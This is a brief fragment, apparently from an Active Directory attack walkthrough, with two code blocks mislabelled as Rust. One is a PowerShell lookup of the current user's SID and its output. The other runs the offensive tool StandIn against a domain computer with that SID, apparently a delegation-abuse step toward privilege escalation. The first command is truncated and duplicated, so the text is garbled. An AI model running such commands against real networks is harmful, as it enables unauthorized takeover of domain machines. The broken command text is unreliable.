```rust
m.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
S-1-5-21-340507432-2615605230-720798708-1293
```

```rust
.\StandIn_v13_Net45.exe --computer M3DC --sid "S-1-5-21-340507432-2615605230-720798708-1293"
```